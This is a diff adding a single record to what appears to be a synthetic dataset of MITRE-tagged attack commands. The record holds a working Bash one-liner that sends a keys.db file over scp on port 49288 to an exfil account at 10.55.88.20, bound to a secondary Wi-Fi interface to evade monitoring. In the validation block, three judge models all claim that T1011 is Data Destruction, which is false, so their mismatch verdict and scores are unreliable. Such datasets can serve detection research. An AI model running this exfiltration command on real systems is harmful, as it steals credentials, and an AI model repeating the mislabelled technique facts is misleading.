@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && scp -q -P 49288 -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" /home/user/.local/share/keys.db exfil@10.55.88.20:~/rx/keys.db",
+  "explanation": "Performs scp over a non-standard port and binds to wlan1, exfiltrating via a different wireless medium in accordance with T1011.",
+  "rationale_steps": [
+    "Monitor wlan1 readiness using iwconfig.",
+    "Bind SSH to the wlan1 IP to ensure traffic uses the alternate Wi\u2011Fi link.",
+    "Copy the file over an uncommon port to reduce overlap with standard SSH monitoring."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-84523189",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags, correct command separators, and appropriate use of command substitution.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically valid for data exfiltration, it implements T1048 (Exfiltration Over Alternative Protocol) rather than T1011 (Data Destruction) as it copies rather than destroys data.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T01:10:26.117023Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct subshell expansion for binding the address.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration using `scp`, which is the act of copying data out, and is diametrically opposed to T1011 Data Destruction, which involves rendering data unrecoverable.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:10:32.062554Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid pipes and redirections, and legitimate scp/ssh options and arguments.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration via scp bound to wlan1 and a non-standard port, not data destruction as described for the technique.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:11:14.163194Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
